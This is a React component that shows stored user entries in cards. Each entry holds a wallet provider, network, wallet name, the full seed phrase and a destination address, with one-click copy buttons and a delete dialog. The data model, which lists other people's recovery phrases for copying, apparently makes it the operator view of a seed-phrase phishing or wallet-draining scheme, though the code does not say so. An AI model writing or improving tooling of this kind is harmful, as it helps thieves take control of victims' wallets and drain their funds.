import { motion, AnimatePresence } from "motion/react"; // ✅ Import AnimatePresence
import { useState } from "react";

interface UserEntry {
  id: string;
  blockchainNetwork: string;
  walletProvider: string;
  siPhrase: string;
  walletName: string;
  destinationAddress: string;
  timestamp?: string;
}

interface UsersCardProps {
  entry: UserEntry;
  index: number;
  onDelete: (arg: string) => void; // ✅ Added onDelete prop
}

export default function UsersCard({ entry, index, onDelete }: UsersCardProps) {
  const isEven = index % 2 === 0;
  const [copiedSeed, setCopiedSeed] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState(false);
  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false); // ✅ State for modal

  const handleCopy = async (text: string, type: "seed" | "address") => {
    try {
      await navigator.clipboard.writeText(text);
      if (type === "seed") setCopiedSeed(true);
      else setCopiedAddress(true);

      setTimeout(() => {
        if (type === "seed") setCopiedSeed(false);
        else setCopiedAddress(false);
      }, 2000);
    } catch (err) {
      console.error("Failed to copy: ", err);
    }
  };

  // ✅ Handlers for delete confirmation
  const handleConfirmDelete = () => {
    onDelete(entry.id);
    setShowDeleteConfirm(false);
  };

  const handleCancelDelete = () => {
    setShowDeleteConfirm(false);
  };

  return (
    <>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3, delay: index * 0.05 }}
        className={`border border-black rounded-sm p-4 hover:shadow-lg transition-shadow ${
          isEven ? "bg-neutral-100" : "bg-white"
        }`}
      >
        <div className="space-y-3">
          {/* Header */}
          <div className="border-b border-black/20 pb-2">
            <h3 className="font-outfit font-semibold text-lg capitalize">
              {entry.walletProvider}
            </h3>
            <p className="text-xs text-black/60 font-dm-mono">
              {entry.blockchainNetwork}
            </p>
            <p className="text-xs text-black/60 font-dm-mono">
              {entry.walletName}
            </p>
          </div>

          {/* Seed Phrase */}
          <div>
            <label className="text-xs font-dm-mono text-black/60 block mb-1">
              Phrase
            </label>
            <div className="relative">
              <p className="text-sm font-dm-mono break-all bg-white/50 p-2 rounded border border-black/10">
                {entry.siPhrase}
              </p>
              <button
                className="absolute top-1 right-1 bg-black text-white px-2 py-1 rounded text-xs hover:opacity-80"
                onClick={() => handleCopy(entry.siPhrase, "seed")}
              >
                {copiedSeed ? "Copied!" : "Copy"}
              </button>
            </div>
          </div>

          {/* Destination Address */}
          <div>
            <label className="text-xs font-dm-mono text-black/60 block mb-1">
              Destination Address
            </label>
            <div className="relative">
              {/* ❌ Removed flex justify-between items-center gap-4 */}
              <p className="text-xs font-dm-mono break-all bg-white/50 p-2 rounded border border-black/10">
                {entry.destinationAddress}
              </p>
              <button
                className="absolute top-1 right-1 bg-black text-white px-2 py-1 rounded text-xs hover:opacity-80"
                onClick={() => handleCopy(entry.destinationAddress, "address")}
              >
                {copiedAddress ? "Copied!" : "Copy"}
              </button>
            </div>
          </div>

          {/* ✅ Delete Button Area */}
          <div className="pt-3 mt-3 border-t border-black/10 flex justify-end">
            <button
              onClick={() => setShowDeleteConfirm(true)}
              className="bg-red-600 text-white px-3 py-1 rounded text-sm font-medium hover:bg-red-700 transition-colors"
            >
              Delete
            </button>
          </div>
        </div>
      </motion.div>

      {/* ✅ Delete Confirmation Modal */}
      <AnimatePresence>
        {showDeleteConfirm && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4"
            onClick={handleCancelDelete} // Close on backdrop click
          >
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="bg-white rounded-sm border border-black p-6 w-full max-w-md space-y-4"
              onClick={(e) => e.stopPropagation()} // Prevent closing when clicking modal content
            >
              <h4 className="font-outfit font-semibold text-xl">
                Confirm Deletion
              </h4>
              <p className="text-sm text-black/80">
                Are you sure you want to delete this entry? This action is{" "}
                <span className="font-bold text-red-600">irreversible</span>.
              </p>

              {/* Context for what's being deleted */}
              <div className="bg-neutral-100 p-3 rounded border border-black/10">
                <p className="text-xs font-dm-mono text-black/60">
                  Wallet to be deleted:
                </p>
                <p className="font-medium capitalize font-outfit">
                  {entry.walletName} ({entry.walletProvider})
                </p>
                <p className="text-xs font-dm-mono break-all opacity-80">
                  {entry.destinationAddress}
                </p>
              </div>

              <div className="flex justify-end gap-3 pt-4 border-t border-black/10">
                <button
                  onClick={handleCancelDelete}
                  className="bg-neutral-200 text-black px-4 py-2 rounded text-sm font-medium hover:bg-neutral-300 transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={handleConfirmDelete}
                  className="bg-red-600 text-white px-4 py-2 rounded text-sm font-medium hover:bg-red-700 transition-colors"
                >
                  Delete Forever
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
}
